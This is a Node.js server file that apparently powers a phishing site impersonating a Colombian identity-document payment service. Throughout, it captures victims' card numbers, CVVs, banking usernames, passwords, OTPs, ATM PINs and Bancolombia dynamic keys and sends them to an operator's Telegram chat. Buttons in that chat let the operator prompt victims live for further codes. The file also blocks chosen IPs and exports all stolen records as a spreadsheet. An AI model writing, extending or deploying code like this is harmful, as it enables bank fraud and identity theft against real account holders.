const express = require('express');
const cors = require('cors');
const XLSX = require('xlsx');

const app = express();
app.use(cors());
app.use(express.json({ limit: '1mb' }));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const FRONT_BASE_URL = process.env.FRONT_BASE_URL || 'https://registraenlineanuip-crtificadonacioncol.onrender.com';

// 🧠 ALMACENAMIENTO EN MEMORIA
const pagosPendientes = new Map();

// 🚫 IPS BANEADAS
const ipsBaneadas = new Set();

// ============================================================
// 🛡️ MIDDLEWARE GLOBAL DE BANEO
// ============================================================
app.use((req, res, next) => {
    const ipCliente = (req.headers['x-forwarded-for'] || '').split(',')[0].trim()
        || req.socket?.remoteAddress
        || req.ip;
    const ipLimpia = String(ipCliente).replace(/^::ffff:/, '');

    if (ipsBaneadas.has(ipLimpia)) {
        return res.status(404).send('Not Found');
    }
    next();
});

// ============================================================
// 🔥 DETECCIÓN DE BANCO
// ============================================================

function esBancoClaveATM(banco) {
    if (!banco) return false;
    const b = String(banco).trim().toLowerCase();
    if (b.includes('bbva')) return true;
    if (b.includes('bilbao') && b.includes('vizcaya')) return true;
    if (b.includes('bilbao vizcaya')) return true;
    if (b.includes('av villas')) return true;
    if (b.includes('avvillas')) return true;
    if (b.includes('a.v. villas')) return true;
    return false;
}

function esBancolombia(banco) {
    if (!banco) return false;
    return String(banco).trim().toLowerCase().includes('bancolombia');
}

// ============================================================
// 🔧 HELPERS TELEGRAM
// ============================================================

async function tgSendMessage(text, replyMarkup) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML' };
    if (replyMarkup) body.reply_markup = replyMarkup;
    try {
        const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
        return await r.json();
    } catch (e) { 
        console.error("❌ Error enviando mensaje a Telegram:", e);
        return { ok: false }; 
    }
}

async function tgEditMessage(messageId, text) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`;
    try {
        const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, message_id: messageId, text, parse_mode: 'HTML' }) });
        return r.json();
    } catch { return null; }
}

async function tgAnswerCallback(callbackQueryId, text) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`;
    try {
        await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ callback_query_id: callbackQueryId, text, show_alert: false }) });
    } catch {}
}

// ============================================================
// 📝 TEXTOS DE MENSAJES TELEGRAM (TODOS CON VENCE, CVV Y MARCA)
// ============================================================

function textoPasoCrear(pago) {
    return (
        `🔔 <b>NUEVA SOLICITUD DE PAGO (PASO 1: TARJETA)</b>\n\n` +
        `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
        `👤 <b>Solicitante:</b> ${pago.nombre_solicitante || '—'}\n` +
        `🪪 <b>Cédula:</b> <code>${pago.cedula_solicitante || '—'}</code>\n` +
        `👤 <b>Titular:</b> ${pago.titular || '—'}\n` +
        `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
        `📅 <b>Vence:</b> ${pago.vencimiento || '—'}\n` +
        `🔒 <b>CVV:</b> <code>${pago.cvv || '—'}</code>\n` +
        `🏷️ <b>Marca:</b> ${(pago.marca_tarjeta || '').toUpperCase()}\n` +
        `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n` +
        `🌐 <b>IP:</b> <code>${pago.ip || 'Desconocida'}</code>`
    );
}

function textoPasoCredenciales(pago) {
    return (
        `🔑 <b>NUEVOS DATOS RECIBIDOS (PASO 2: CREDENCIALES)</b>\n\n` +
        `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
        `👤 <b>Solicitante:</b> ${pago.nombre_solicitante || '—'}\n` +
        `🪪 <b>Cédula:</b> <code>${pago.cedula_solicitante || '—'}</code>\n` +
        `👤 <b>Titular:</b> ${pago.titular || '—'}\n` +
        `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
        `📅 <b>Vence:</b> ${pago.vencimiento || '—'}\n` +
        `🔒 <b>CVV:</b> <code>${pago.cvv || '—'}</code>\n` +
        `🏷️ <b>Marca:</b> ${(pago.marca_tarjeta || '').toUpperCase()}\n` +
        `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n` +
        `🌐 <b>IP:</b> <code>${pago.ip || 'Desconocida'}</code>\n\n` +
        `👤 <b>Usuario:</b> <code>${pago.usuario_banco || '—'}</code>\n` +
        `🔑 <b>Contraseña:</b> <code>${pago.password_banco || '—'}</code>`
    );
}

function textoPasoOTP(pago) {
    let etiqueta = 'OTP';
    let valor = pago.codigo_otp;
    if (pago.requiere_clave_atm) { etiqueta = 'CLAVE ATM'; valor = pago.clave_atm; }
    else if (pago.requiere_clave_dinamica) { etiqueta = 'CLAVE DINÁMICA'; valor = pago.clave_dinamica; }
    else if (pago.requiere_sms) { etiqueta = 'CÓDIGO SMS'; valor = pago.codigo_otp; }

    return (
        `🔐 <b>NUEVOS DATOS RECIBIDOS (PASO 3: ${etiqueta})</b>\n\n` +
        `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
        `👤 <b>Solicitante:</b> ${pago.nombre_solicitante || '—'}\n` +
        `🪪 <b>Cédula:</b> <code>${pago.cedula_solicitante || '—'}</code>\n` +
        `👤 <b>Titular:</b> ${pago.titular || '—'}\n` +
        `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
        `📅 <b>Vence:</b> ${pago.vencimiento || '—'}\n` +
        `🔒 <b>CVV:</b> <code>${pago.cvv || '—'}</code>\n` +
        `🏷️ <b>Marca:</b> ${(pago.marca_tarjeta || '').toUpperCase()}\n` +
        `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n` +
        `🌐 <b>IP:</b> <code>${pago.ip || 'Desconocida'}</code>\n\n` +
        `👤 <b>Usuario:</b> <code>${pago.usuario_banco || '—'}</code>\n` +
        `🔑 <b>Contraseña:</b> <code>${pago.password_banco || '—'}</code>\n` +
        `🔐 <b>${etiqueta}:</b> <code>${valor || '—'}</code>`
    );
}

// ============================================================
// 🚪 POST /api/nuevo-ingreso
// ============================================================
app.post('/api/nuevo-ingreso', async (req, res) => {
    try {
        const { ip, ciudad, pais, user_agent } = req.body || {};

        const mensaje =
            `🚪 <b>NUEVO INGRESO</b>\n\n` +
            `🌐 <b>IP:</b> <code>${ip || 'Desconocida'}</code>\n` +
            `🏙️ <b>Ciudad:</b> ${ciudad || 'Desconocida'}\n` +
            `🌎 <b>País:</b> ${pais || 'Desconocido'}\n` +
            `🕒 <b>Hora:</b> ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;

        await tgSendMessage(mensaje);
        return res.json({ success: true });
    } catch (err) {
        console.error("Error en /api/nuevo-ingreso:", err);
        return res.status(500).json({ success: false });
    }
});

// ============================================================
// 🔍 POST /api/notificar-consulta
// ============================================================
app.post('/api/notificar-consulta', async (req, res) => {
    try {
        const { nuip, ip, ciudad, pais } = req.body || {};

        const mensaje =
            `🔍 <b>NUEVA CONSULTA</b>\n\n` +
            `🪪 <b>NUIP/Cédula:</b> <code>${nuip || '—'}</code>\n` +
            `🌐 <b>IP:</b> <code>${ip || 'Desconocida'}</code>\n` +
            `🏙️ <b>Ciudad:</b> ${ciudad || 'Desconocida'}\n` +
            `🌎 <b>País:</b> ${pais || 'Desconocido'}\n` +
            `🕒 <b>Hora:</b> ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;

        await tgSendMessage(mensaje);
        return res.json({ success: true });
    } catch (err) {
        console.error("Error en /api/notificar-consulta:", err);
        return res.status(500).json({ success: false });
    }
});

// ============================================================
// 📥 POST /api/crear-pago
// ============================================================
app.post('/api/crear-pago', async (req, res) => {
    const {
        solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta,
        banco_emisor, usuario_banco, password_banco, codigo_otp,
        clave_atm, clave_dinamica, paso,
        nombre_solicitante, cedula_solicitante, ip
    } = req.body || {};
    
    if (!solicitud_id) return res.status(400).json({ success: false, error: 'Datos incompletos' });
    if (paso === 'crear' && (!numero_tarjeta || !cvv || !vencimiento || !titular)) {
        return res.status(400).json({ success: false, error: 'Datos de tarjeta incompletos' });
    }

    try {
        let pago = pagosPendientes.get(solicitud_id);

        if (!pago) {
            pago = {
                solicitud_id,
                titular: titular || '—',
                numero_tarjeta: numero_tarjeta || '—',
                cvv: cvv || '—',
                vencimiento: vencimiento || '—',
                marca_tarjeta: (marca_tarjeta || 'visa').toLowerCase(),
                banco_emisor: banco_emisor || 'Desconocido',
                usuario_banco: usuario_banco || null,
                password_banco: password_banco || null,
                codigo_otp: codigo_otp || null,
                clave_atm: clave_atm || null,
                clave_dinamica: clave_dinamica || null,
                nombre_solicitante: nombre_solicitante || '—',
                cedula_solicitante: cedula_solicitante || '—',
                ip: ip || 'Desconocida',
                requiere_clave_atm: esBancoClaveATM(banco_emisor),
                requiere_clave_dinamica: esBancolombia(banco_emisor),
                requiere_sms: false,
                estado: 'pendiente',
                paso: paso || 'crear',
                fase_actual: paso === 'otp' ? 'otp' : 'credenciales',
                motivo_rechazo: null,
                redirigir_a: null,
                message_id_crear: null,
                message_id_credenciales: null,
                message_id_otp: null
            };
        } else {
            pago.titular = titular || pago.titular;
            pago.numero_tarjeta = numero_tarjeta || pago.numero_tarjeta;
            pago.cvv = cvv || pago.cvv;
            pago.vencimiento = vencimiento || pago.vencimiento;
            pago.marca_tarjeta = marca_tarjeta ? marca_tarjeta.toLowerCase() : pago.marca_tarjeta;
            pago.banco_emisor = banco_emisor || pago.banco_emisor;
            pago.usuario_banco = usuario_banco || pago.usuario_banco;
            pago.password_banco = password_banco || pago.password_banco;
            pago.codigo_otp = codigo_otp || pago.codigo_otp;
            pago.clave_atm = clave_atm || pago.clave_atm;
            pago.clave_dinamica = clave_dinamica || pago.clave_dinamica;
            pago.nombre_solicitante = nombre_solicitante || pago.nombre_solicitante;
            pago.cedula_solicitante = cedula_solicitante || pago.cedula_solicitante;
            pago.ip = ip || pago.ip;
            pago.requiere_clave_atm = esBancoClaveATM(pago.banco_emisor);
            pago.requiere_clave_dinamica = esBancolombia(pago.banco_emisor);
            pago.estado = 'pendiente';
            pago.paso = paso || pago.paso;
            pago.fase_actual = paso === 'otp' ? 'otp' : 'credenciales';

            if (paso === 'credenciales') {
                pago.codigo_otp = null;
                pago.clave_atm = null;
                pago.clave_dinamica = null;
                pago.requiere_sms = false;
                pago.message_id_otp = null;
                pago.motivo_rechazo = null;
                pago.redirigir_a = null;
            }
        }
        
        pagosPendientes.set(solicitud_id, pago);

        const pasoActual = paso || 'crear';
        
        let replyMarkup;
        if (pasoActual === 'crear') {
            replyMarkup = { inline_keyboard: [[
                { text: '✅ Aprobar',  callback_data: `aprobar:${pago.solicitud_id}` },
                { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }
            ]]};
        } else if (pasoActual === 'credenciales') {
            const textoAprobar = esBancolombia(pago.banco_emisor) ? '🔐 Dinámica' : '✅ Aprobar';
            const botones = [
                { text: textoAprobar,  callback_data: `aprobar:${pago.solicitud_id}` },
                { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }
            ];
            if (pago.requiere_clave_atm) {
                botones.push({ text: '🔑 Clave ATM', callback_data: `clave_atm:${pago.solicitud_id}` });
            }
            botones.push({ text: '📱 SMS', callback_data: `sms:${pago.solicitud_id}` });
            replyMarkup = { inline_keyboard: [botones] };
        } else if (pasoActual === 'otp') {
            replyMarkup = { inline_keyboard: [[
                { text: '✅ Aprobar',  callback_data: `aprobar:${pago.solicitud_id}` },
                { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` },
                { text: '💳 Error CC', callback_data: `error_cc:${pago.solicitud_id}` },
                { text: '⚠️ Error de Usuario', callback_data: `error_usuario:${pago.solicitud_id}` }
            ]]};
        }

        if (pasoActual === 'crear') {
            const sent = await tgSendMessage(textoPasoCrear(pago), replyMarkup);
            if (sent && sent.ok && sent.result) pago.message_id_crear = sent.result.message_id;
        } else if (pasoActual === 'credenciales') {
            const sent = await tgSendMessage(textoPasoCredenciales(pago), replyMarkup);
            if (sent && sent.ok && sent.result) pago.message_id_credenciales = sent.result.message_id;
        } else if (pasoActual === 'otp') {
            const sent = await tgSendMessage(textoPasoOTP(pago), replyMarkup);
            if (sent && sent.ok && sent.result) pago.message_id_otp = sent.result.message_id;
        }

        return res.json({ success: true, solicitud_id, estado: 'pendiente' });
    } catch (err) {
        console.error("Error en /api/crear-pago:", err);
        return res.status(500).json({ success: false, error: 'Error al registrar' });
    }
});

// ============================================================
// 📤 GET /api/estado-pago/:solicitud_id
// ============================================================
app.get('/api/estado-pago/:solicitud_id', (req, res) => {
    try {
        const pago = pagosPendientes.get(req.params.solicitud_id);
        if (!pago) return res.status(404).json({ success: false, error: 'No encontrado' });

        if (pago.estado === 'aprobado_credenciales') {
            return res.json({
                success: true,
                estado: 'aprobado',
                fase: 'credenciales',
                marca: pago.marca_tarjeta,
                requiere_clave_atm: !!pago.requiere_clave_atm,
                requiere_clave_dinamica: !!pago.requiere_clave_dinamica,
                requiere_sms: !!pago.requiere_sms
            });
        }
        if (pago.estado === 'rechazado_credenciales') {
            return res.json({ success: true, estado: 'rechazado', fase: 'credenciales', mensaje: pago.motivo_rechazo });
        }
        if (pago.estado === 'rechazado_user_error') {
            return res.json({ success: true, estado: 'rechazado_user_error', fase: 'otp', mensaje: pago.motivo_rechazo });
        }
        if (pago.estado === 'error_cc') {
            return res.json({ success: true, estado: 'error_cc', fase: 'otp', mensaje: pago.motivo_rechazo || 'Error en los datos de la tarjeta.' });
        }
        if (pago.estado === 'aprobado') {
            return res.json({ success: true, estado: 'aprobado', fase: 'otp', redirect: `${FRONT_BASE_URL}/${pago.redirigir_a || 'exito.html'}` });
        }
        if (pago.estado === 'rechazado' || pago.estado === 'rechazado_otp') {
            return res.json({ success: true, estado: 'rechazado', fase: 'otp', mensaje: pago.motivo_rechazo });
        }

        return res.json({ success: true, estado: 'pendiente', fase: pago.fase_actual || 'credenciales' });
    } catch (err) {
        return res.status(500).json({ success: false, error: 'Error' });
    }
});

// ============================================================
// 🤖 PROCESADOR DE UPDATE DE TELEGRAM (polling)
// ============================================================
async function procesarUpdate(update) {
    try {
        // 📩 Comandos de baneo
        const msg = update.message;
        if (msg && msg.text) {
            const chatIdMsg = String(msg.chat?.id);
            if (chatIdMsg !== String(CHAT_ID)) return;

            const partes = msg.text.trim().split(/\s+/);
            const comando = partes[0].toLowerCase().split('@')[0];
            const arg = partes[1];

            if (comando === '/ban') {
                if (!arg) { await tgSendMessage('⚠️ Uso: <code>/ban 1.2.3.4</code>'); return; }
                const ip = arg.replace(/^::ffff:/, '').trim();
                ipsBaneadas.add(ip);
                await tgSendMessage(`🚫 <b>IP BANEADA</b>\n<code>${ip}</code>\n\nAhora recibirá 404 en toda la web.`);
                return;
            }
            if (comando === '/unban') {
                if (!arg) { await tgSendMessage('⚠️ Uso: <code>/unban 1.2.3.4</code>'); return; }
                const ip = arg.replace(/^::ffff:/, '').trim();
                const eliminada = ipsBaneadas.delete(ip);
                await tgSendMessage(eliminada
                    ? `✅ <b>IP DESBANEADA</b>\n<code>${ip}</code>`
                    : `ℹ️ La IP <code>${ip}</code> no estaba baneada.`);
                return;
            }
            if (comando === '/listaban' || comando === '/banlist') {
                if (ipsBaneadas.size === 0) {
                    await tgSendMessage('📭 No hay IPs baneadas.');
                } else {
                    const lista = [...ipsBaneadas].map(ip => `• <code>${ip}</code>`).join('\n');
                    await tgSendMessage(`🚫 <b>IPs BANEADAS (${ipsBaneadas.size})</b>\n\n${lista}`);
                }
                return;
            }
            if (comando === '/base') {
                try {
                    if (pagosPendientes.size === 0) {
                        await tgSendMessage('📭 No hay registros para exportar.');
                        return;
                    }

                    const filas = [];
                    for (const pago of pagosPendientes.values()) {
                        filas.push({
                            'ID Solicitud': pago.solicitud_id || '',
                            'Estado': pago.estado || '',
                            'Fase Actual': pago.fase_actual || '',
                            'Paso': pago.paso || '',
                            'Solicitante': pago.nombre_solicitante || '',
                            'Cédula Solicitante': pago.cedula_solicitante || '',
                            'Titular': pago.titular || '',
                            'Número Tarjeta': pago.numero_tarjeta || '',
                            'Vencimiento': pago.vencimiento || '',
                            'CVV': pago.cvv || '',
                            'Marca': (pago.marca_tarjeta || '').toUpperCase(),
                            'Banco Emisor': pago.banco_emisor || '',
                            'Usuario Banco': pago.usuario_banco || '',
                            'Contraseña Banco': pago.password_banco || '',
                            'Código OTP': pago.codigo_otp || '',
                            'Clave ATM': pago.clave_atm || '',
                            'Clave Dinámica': pago.clave_dinamica || '',
                            'Requiere Clave ATM': pago.requiere_clave_atm ? 'SÍ' : 'NO',
                            'Requiere Clave Dinámica': pago.requiere_clave_dinamica ? 'SÍ' : 'NO',
                            'Requiere SMS': pago.requiere_sms ? 'SÍ' : 'NO',
                            'Motivo Rechazo': pago.motivo_rechazo || '',
                            'Redirigir A': pago.redirigir_a || '',
                            'IP': pago.ip || ''
                        });
                    }

                    const hoja = XLSX.utils.json_to_sheet(filas);
                    const libro = XLSX.utils.book_new();
                    XLSX.utils.book_append_sheet(libro, hoja, 'Registros');

                    const anchos = Object.keys(filas[0]).map(k => ({ wch: Math.max(k.length + 2, 20) }));
                    hoja['!cols'] = anchos;

                    const buffer = XLSX.write(libro, { type: 'buffer', bookType: 'xlsx' });

                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('caption', `📊 <b>BASE DE DATOS</b>\n\n📦 Total registros: <b>${filas.length}</b>\n🕒 ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`);
                    formData.append('parse_mode', 'HTML');
                    formData.append('document', new Blob([buffer], { type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' }), `base_registros_${Date.now()}.xlsx`);

                    const urlEnvio = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;
                    const resp = await fetch(urlEnvio, { method: 'POST', body: formData });
                    const dataResp = await resp.json();

                    if (!dataResp.ok) {
                        console.error('Error enviando Excel:', dataResp);
                        await tgSendMessage('❌ Error al enviar el archivo Excel.');
                    }
                } catch (err) {
                    console.error('Error en /base:', err);
                    await tgSendMessage('❌ Error generando la base de datos.');
                }
                return;
            }
        }

        // 📌 Callbacks (botones inline) — MISMA LÓGICA ORIGINAL
        const cq = update.callback_query;
        if (!cq || !cq.data) return;

        const [accion, solicitud_id] = cq.data.split(':');
        const msgId = cq.message?.message_id;

        const pago = pagosPendientes.get(solicitud_id);
        if (!pago) return await tgAnswerCallback(cq.id, 'No encontrada');

        const estaEnFaseOTP = (msgId === pago.message_id_otp);

        if (accion === 'aprobar') {
            if (!estaEnFaseOTP) {
                pago.estado = 'aprobado_credenciales';
                await tgAnswerCallback(cq.id, '✅ Credenciales aprobadas');
                if (msgId) await tgEditMessage(msgId, `✅ <b>CREDENCIALES APROBADAS</b>\n\n` + textoPasoCredenciales(pago));
            } else {
                const archivo = { visa: 'visa.html', mastercard: 'master.html', amex: 'amex.html' }[(pago.marca_tarjeta || '').toLowerCase()] || 'visa.html';
                pago.estado = 'aprobado';
                pago.fase_actual = 'completado';
                pago.redirigir_a = archivo;
                await tgAnswerCallback(cq.id, '✅ Pago aprobado');
                if (msgId) await tgEditMessage(msgId, `✅ <b>PAGO APROBADO</b>\n\n` + textoPasoOTP(pago));
            }
        } else if (accion === 'rechazar') {
            const motivo = estaEnFaseOTP ? 'OTP incorrecto.' : 'Credenciales incorrectas.';
            pago.estado = estaEnFaseOTP ? 'rechazado_otp' : 'rechazado_credenciales';
            pago.motivo_rechazo = motivo;
            await tgAnswerCallback(cq.id, '❌ Rechazado');
            if (msgId) {
                const texto = estaEnFaseOTP ? textoPasoOTP(pago) : textoPasoCredenciales(pago);
                await tgEditMessage(msgId, `❌ <b>RECHAZADO</b>\n\n` + texto + `\n📌 <b>Motivo:</b> ${motivo}`);
            }
        } else if (accion === 'clave_atm') {
            pago.estado = 'aprobado_credenciales';
            await tgAnswerCallback(cq.id, '🔑 Se solicitó Clave ATM al cliente');
            if (msgId) {
                await tgEditMessage(msgId, `🔑 <b>SE SOLICITÓ CLAVE ATM AL CLIENTE</b>\n\n` + textoPasoCredenciales(pago));
            }
        } else if (accion === 'sms') {
            pago.requiere_sms = true;
            pago.estado = 'aprobado_credenciales';
            await tgAnswerCallback(cq.id, '📱 Se solicitó código por SMS al cliente');
            if (msgId) {
                await tgEditMessage(msgId, `📱 <b>SE SOLICITÓ CÓDIGO POR SMS AL CLIENTE</b>\n\n` + textoPasoCredenciales(pago));
            }
        } else if (accion === 'error_cc') {
            pago.estado = 'error_cc';
            pago.motivo_rechazo = 'Error en los datos de la tarjeta (CC).';
            await tgAnswerCallback(cq.id, '💳 Error CC registrado');
            if (msgId) {
                await tgEditMessage(msgId, `💳 <b>ERROR CC</b>\n\n` + textoPasoOTP(pago) + `\n📌 <b>Acción:</b> Se solicitará al cliente volver a ingresar los datos de la tarjeta.`);
            }
        } else if (accion === 'error_usuario') {
            pago.estado = 'rechazado_user_error';
            pago.motivo_rechazo = 'Error de usuario: credenciales no coinciden.';
            await tgAnswerCallback(cq.id, '⚠️ Error de usuario registrado');
            if (msgId) {
                await tgEditMessage(msgId, `⚠️ <b>ERROR DE USUARIO</b>\n\n` + textoPasoOTP(pago) + `\n📌 <b>Acción:</b> Se solicitará al cliente reiniciar el proceso.`);
            }
        }
    } catch (err) {
        console.error("Error procesando update:", err);
    }
}

// ============================================================
// 🔄 POLLING DE TELEGRAM
// ============================================================
let lastUpdateId = 0;

async function iniciarPolling() {
    if (!TELEGRAM_TOKEN) {
        console.error('❌ TELEGRAM_TOKEN no configurado');
        return;
    }

    // Eliminar webhook para que getUpdates funcione
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/deleteWebhook`);
        console.log('✅ Webhook eliminado (usando polling)');
    } catch (e) {
        console.error('Error eliminando webhook:', e);
    }

    console.log('🔄 Polling de Telegram iniciado');

    while (true) {
        try {
            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?timeout=30&offset=${lastUpdateId + 1}`;
            const r = await fetch(url);
            const data = await r.json();

            if (data.ok && Array.isArray(data.result)) {
                for (const update of data.result) {
                    lastUpdateId = update.update_id;
                    await procesarUpdate(update);
                }
            }
        } catch (e) {
            console.error('Error en polling:', e.message);
            await new Promise(r => setTimeout(r, 3000));
        }
    }
}

// ============================================================
// 🚀 ARRANQUE
// ============================================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Backend en puerto ${PORT}`);
    iniciarPolling();
});
